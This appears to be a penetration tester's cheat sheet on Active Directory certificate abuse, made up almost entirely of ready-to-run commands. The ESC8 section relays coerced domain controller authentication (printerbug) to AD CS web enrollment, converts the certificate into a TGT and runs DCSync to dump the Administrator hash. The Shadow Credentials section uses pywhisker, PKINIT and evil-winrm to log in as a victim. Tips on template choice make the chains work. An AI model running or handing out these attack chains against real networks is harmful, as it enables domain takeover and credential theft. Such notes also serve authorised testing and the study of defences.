# Pass the Certificate

## ESC8 — NTLM Relay to AD CS Web Enrollment

Requires AD CS with HTTP web enrollment enabled. Relay DC machine account auth to `/certsrv/certfnsh.asp` → get DC$ cert → TGT → DCSync.

Start relay targeting the CA web enrollment endpoint:

```bash
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

Coerce DC auth to your host via printer bug (requires Spooler running on target):

```bash
python3 printerbug.py <DOMAIN>/<USER>:"<PASS>"@<DC_IP> <LHOST>
```

Relay catches auth, writes `DC01$.pfx` to disk. Convert cert to TGT:

```bash
python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip <DC_IP> '<DOMAIN>/dc01$' /tmp/dc.ccache
export KRB5CCNAME=/tmp/dc.ccache
```

DCSync as DC machine account:

```bash
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/DC01$'@<DC_FQDN>
```

## Shadow Credentials (AddKeyCredentialLink)

Requires WriteProperty over target user's `msDS-KeyCredentialLink` — BloodHound edge: `AddKeyCredentialLink`. Write attacker-controlled public key to victim's attribute:

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <CONTROLLED_USER> -p '<PASS>' --target <VICTIM_USER> --action add
```

Outputs a .pfx file + password. Use them to get TGT as victim:

```bash
python3 gettgtpkinit.py -cert-pfx <FILE>.pfx -pfx-pass '<PFX_PASS>' -dc-ip <DC_IP> <DOMAIN>/<VICTIM_USER> /tmp/<VICTIM>.ccache
export KRB5CCNAME=/tmp/<VICTIM>.ccache
evil-winrm -i <TARGET_FQDN> -r <DOMAIN>
```

> [!tip] After getting any TGT via certificate — same PtT pipeline as always: `export KRB5CCNAME` → impacket/evil-winrm with `-k -no-pass`. The cert is just the path to the ticket, not a different lateral movement technique.

> [!warning] `--template KerberosAuthentication` is the DC auth template — verify the correct template name with certipy first. Wrong template = relay succeeds but cert is unusable for DC impersonation.